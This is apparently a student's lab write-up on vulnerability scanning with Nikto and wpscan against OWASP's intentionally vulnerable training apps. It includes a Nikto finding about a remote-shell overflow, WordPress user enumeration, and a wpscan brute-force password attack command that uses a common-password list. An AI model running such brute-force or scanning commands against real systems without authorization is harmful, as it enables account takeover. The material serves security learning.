# Vulnerability Scanning

This is following Chapter 7 of Kali Linux 2019 - Working with Vulnerability Scanners.

# Nikto
In this section, we will use Nikto to check known vulnerabilities in OWASP's Multidae Application.

As mentioned in the book, Nikto is not a stealth oriented tool as it can be noisy while it is doing its scanning.

This gives us a list of items of known vulnerabilities. We can use the Open Source Vulnerability Database (OSVDB) to look up how to attack this vulnerability.

One thing that catches my eye is the ability to run a remote shell.

```
+ mod_ssl/2.2.14 OpenSSL/0.9.8k Phusion_Passenger/4.0.38 mod_perl/2.0.4 Perl/v5.10.1 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.                                                                                     
```

The link has plenty of information about this vulnerability.

We'll note this down and possible come around to this for later blogs.

# WordPressScan

Wordpress is a fairly old way of getting websites up using a Content Management System (CMS). There are still a number of sites running on this and Wordpress is still one of the most popular CMS's around.

There is a OWASP Broken Web App for Wordpress at: http://bwa/wordpress/

With the above, we find out that there is an account called `admin`.

Let's try cracking `admin`'s password.

## Cracking passwords using SecLists

There is a github repo for known security lists. We can download it using:

```sh
kali@kali:~$ git clone https://github.com/danielmiessler/SecLists
```

For example, here is a list of the most common passwords around the web:

```sh
kali@kali:~$ head -10 SecLists/Passwords/darkweb2017-top1000.txt 
123456
123456789
111111
password
qwerty
abc123
12345678
password1
1234567
123123
```

Bruteforcing a way in by enumerating all passwords from a list:


```sh
wpscan --url http://bwa/wordpress -e u --passwords SecLists/Passwords/darkweb2017-top1000.txt 
[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 1 user/s
Error: Unknown response received Code: 302
